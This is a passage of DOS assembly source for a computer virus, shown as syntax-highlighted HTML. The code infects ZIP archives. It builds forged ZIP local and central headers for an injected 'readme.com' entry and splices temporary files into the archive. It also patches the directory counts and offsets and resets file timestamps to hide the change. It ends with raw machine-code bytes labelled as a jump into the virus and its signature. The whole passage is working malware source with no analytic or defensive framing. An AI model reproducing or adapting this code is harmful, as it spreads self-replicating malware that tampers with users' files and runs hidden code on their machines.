</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_compressed_size_</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_uncompressed_size_</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">write_ta_mere_dir_hdr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">zip_central_header_struc</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc4">+</span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc1">;-------------merge dir part with principal zip part-------------------------</span><span class="sc0">

</span><span class="sc5">read_dir_file_size</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc4">+</span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dir_file_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">pointer_to_start_of_dir_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc5">read_dir_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dir_file_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">merge_dir_with_zip</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">close_dir_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_dir_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">erase_dir_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_dir</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">erase_file</span><span class="sc0">

</span><span class="sc1">;-------------write modified end part to the end of principal+dir part-------------------------</span><span class="sc0">

</span><span class="sc5">pointer_to_start_of_end_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_end_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pointeur_debut</span><span class="sc0">

</span><span class="sc5">read_end_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">end_file_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">read_file</span><span class="sc0">

</span><span class="sc5">change_some_things_in_end_hdr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;ttl_num_of_ent_on_this_disk</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">0Ah</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">;ttl_num_of_ent_in_the_cent_dir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">2Eh</span><span class="sc4">+</span><span class="sc2">10d</span><span class="sc0">  </span><span class="sc1">;size_of_the_central_directory</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1Eh</span><span class="sc4">+</span><span class="sc2">10d</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">taille_fse</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">virus_zip_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">               </span><span class="sc1">;off_of_strt_of_cent_directory</span><span class="sc0">
</span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">heap</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">merge_end_with_zip</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">end_file_size</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">write_file</span><span class="sc0">

</span><span class="sc5">close_end_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_end_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">erase_end_file</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_end</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">erase_file</span><span class="sc0">

</span><span class="sc5">close_new_zip</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">zip_handle</span><span class="sc4">-</span><span class="sc5">start_virus</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">set_timedate</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">close_file</span><span class="sc0">

</span><span class="sc5">end_zip_infect</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">pop_all</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">zip_local_header_struc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">zip_loc_sign</span><span class="sc0">                         </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc3">"PK"</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc1">;  0</span><span class="sc0">
</span><span class="sc5">zip_ver_ned_to_extr</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  4</span><span class="sc0">
</span><span class="sc5">zip_flags</span><span class="sc0">                            </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;  6</span><span class="sc0">
</span><span class="sc5">zip_compression_method</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;  8</span><span class="sc0">
</span><span class="sc5">zip_file_time</span><span class="sc0">                        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc0">  </span><span class="sc1">;  A</span><span class="sc0">
</span><span class="sc5">zip_file_date</span><span class="sc0">                        </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">  </span><span class="sc1">;  C</span><span class="sc0">
</span><span class="sc5">zip_crc_32</span><span class="sc0">                           </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">;  E</span><span class="sc0">
</span><span class="sc5">zip_compressed_size</span><span class="sc0">                  </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">50d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">; 12</span><span class="sc0">
</span><span class="sc5">zip_uncompressed_size</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">50d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">; 16</span><span class="sc0">
</span><span class="sc5">zip_size_fname</span><span class="sc0">                       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">10d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; 1A</span><span class="sc0">
</span><span class="sc5">zip_extra_field_length</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; 1C</span><span class="sc0">
</span><span class="sc5">zip_filename</span><span class="sc0">                   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"readme.com"</span><span class="sc0">     </span><span class="sc1">; 1E</span><span class="sc0">

</span><span class="sc5">zip_central_header_struc</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">zip_centr_sign_</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc3">"PK"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc1">;  0</span><span class="sc0">
</span><span class="sc5">zip_ver_made_by_</span><span class="sc0">                     </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">14</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">;  4</span><span class="sc0">
</span><span class="sc5">zip_ver_ned_to_extr_</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0Ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">;  6</span><span class="sc0">
</span><span class="sc5">zip_flags_</span><span class="sc0">                           </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;  8</span><span class="sc0">
</span><span class="sc5">zip_compression_method_</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">;  A</span><span class="sc0">
</span><span class="sc5">zip_file_time_</span><span class="sc0">                       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">66h</span><span class="sc4">,</span><span class="sc2">8eh</span><span class="sc0">  </span><span class="sc1">;  C</span><span class="sc0">
</span><span class="sc5">zip_file_date_</span><span class="sc0">                       </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">37h</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">  </span><span class="sc1">;  E</span><span class="sc0">
</span><span class="sc5">zip_crc_32_</span><span class="sc0">                          </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 10</span><span class="sc0">
</span><span class="sc5">zip_compressed_size_</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">50d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">; 14</span><span class="sc0">
</span><span class="sc5">zip_uncompressed_size_</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">50d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc1">; 18</span><span class="sc0">
</span><span class="sc5">zip_size_fname_</span><span class="sc0">                      </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">10d</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; 1C</span><span class="sc0">
</span><span class="sc5">zip_extra_field_length_</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; 1E</span><span class="sc0">
</span><span class="sc5">zip_file_comment_length_</span><span class="sc0">             </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; 20</span><span class="sc0">
</span><span class="sc5">zip_disk_number_start_</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; 22</span><span class="sc0">
</span><span class="sc5">zip_intrnl_file_attr_</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">      </span><span class="sc1">; 24</span><span class="sc0">
</span><span class="sc5">zip_extrnl_file_attr_</span><span class="sc0">                </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; 26</span><span class="sc0">
</span><span class="sc5">zip_rel_off_of_loc_hdr_</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0">     </span><span class="sc10">?</span><span class="sc0">        </span><span class="sc1">; 2A</span><span class="sc0">
</span><span class="sc5">zip_filename_</span><span class="sc0">              </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"readme.com"</span><span class="sc0">         </span><span class="sc1">; 2E</span><span class="sc0">

</span><span class="sc5">file_dir</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"dir.ska"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_end</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"end.ska"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">file_add</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"add.ska"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">zip_handle</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc3">"h1"</span><span class="sc0">
</span><span class="sc5">file_dir_handle</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc3">"h2"</span><span class="sc0">
</span><span class="sc5">file_end_handle</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc3">"h3"</span><span class="sc0">
</span><span class="sc5">file_add_handle</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc3">"h5"</span><span class="sc0">
</span><span class="sc5">dir_file_size</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc3">"sz"</span><span class="sc0">
</span><span class="sc5">end_file_size</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc3">"sz"</span><span class="sc0">
</span><span class="sc5">virus_zip_size</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">number_of_entries</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">buffer_name</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc3">"b"</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">file_add_content1</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc1">;etoiles</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ADh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">69h</span><span class="sc0">            </span><span class="sc1">;jmp to virus+sig</span><span class="sc0">
   </span><span class="sc1">;          DB 0B0H,013H,0CDH,010h</span><span class="sc0">
     </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">00DH</span><span class="sc4">,</span><span class="sc2">00AH</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0BEH</span><span class="sc4">,</span><span class="sc2">084H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">00FH</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc4">,</span><span class="sc2">066H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">006H</span><span class="sc4">,</span><span class="sc2">00CH</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0B1H</span><span class="sc4">,</span><span class="sc2">01DH</span><span class="sc4">,</span><span class="sc2">0E8H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">05AH</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">0BFH</span><span class="sc4">,</span><span class="sc2">0B0H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0B9H</span><span class="sc4">,</span><span class="sc2">0B0H</span><span class="sc4">,</span><span class="sc2">004H</span><span class="sc4">,</span><span class="sc2">058H</span><span class="sc4">,</span><span class="sc2">0B6H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">084H</span><span class="sc4">,</span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">040H</span><span class="sc4">,</span><span class="sc2">050H</span><span class="sc4">,</span><span class="sc2">0ABH</span><span class="sc4">,</span><span class="sc2">08AH</span><span class="sc4">,</span><span class="sc2">0C2H</span><span class="sc4">,</span><span class="sc2">024H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0FEH</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc4">,</span><span class="sc2">0AAH</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">0EFH</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">0A0H</span><span class="sc4">,</span><span class="sc2">08EH</span><span class="sc4">,</span><span class="sc2">0C0H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">0BAH</span><span class="sc4">,</span><span class="sc2">0DAH</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0ECH</span><span class="sc4">,</span><span class="sc2">0A8H</span><span class="sc4">,</span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc4">,</span><span class="sc2">0FBH</span><span class="sc4">,</span><span class="sc2">0BEH</span><span class="sc4">,</span><span class="sc2">0B0H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0B9H</span><span class="sc4">,</span><span class="sc2">0B0H</span><span class="sc4">,</span><span class="sc2">004H</span><span class="sc4">,</span><span class="sc2">0ADH</span><span class="sc4">,</span><span class="sc2">08BH</span><span class="sc4">,</span><span class="sc2">0F8H</span><span class="sc4">,</span><span class="sc2">032H</span><span class="sc4">,</span><span class="sc2">0E4H</span><span class="sc4">,</span><span class="sc2">0ACH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">057H</span><span class="sc4">,</span><span class="sc2">0BBH</span><span class="sc4">,</span><span class="sc2">040H</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">0F7H</span><span class="sc4">,</span><span class="sc2">0E3H</span><span class="sc4">,</span><span class="sc2">05BH</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">0D8H</span><span class="sc4">,</span><span class="sc2">089H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">05CH</span><span class="sc4">,</span><span class="sc2">0FDH</span><span class="sc4">,</span><span class="sc2">026H</span><span class="sc4">,</span><span class="sc2">080H</span><span class="sc4">,</span><span class="sc2">025H</span><span class="sc4">,</span><span class="sc2">0F0H</span><span class="sc4">,</span><span class="sc2">08AH</span><span class="sc4">,</span><span class="sc2">0C1H</span><span class="sc4">,</span><span class="sc2">024H</span><span class="sc4">,</span><span class="sc2">00FH</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">026H</span><span class="sc4">,</span><span class="sc2">008H</span><span class="sc4">,</span><span class="sc2">007H</span><span class="sc4">,</span><span class="sc2">0E2H</span><span class="sc4">,</span><span class="sc2">0E1H</span><span class="sc4">,</span><span class="sc2">0E4H</span><span class="sc4">,</span><span class="sc2">060H</span><span class="sc4">,</span><span class="sc2">03CH</span><span class="sc4">,</span><span class="sc2">001H</span><span class="sc4">,</span><span class="sc2">074H</span><span class="sc0">
         </span><span class="sc9">DB</span><span class="sc0"> </span><span class="sc2">002H</span><span class="sc4">,</span><span class="sc2">0EBH</span><span class="sc4">,</span><span class="sc2">0CBH</span><span class="sc4">,</span><span class="sc2">0B8H</span><span class="sc4">,</span><span class="sc2">003H</span><span class="sc4">,</span><span class="sc2">000H</span><span class="sc4">,</span><span class="sc2">0CDH</span><span class="sc4">,</span><span class="sc2">010H</span><span class="sc4">,</span><span class="sc2">0B4H</span><span class="sc4">,</span><span class="sc2">04CH</span><span class="sc0">
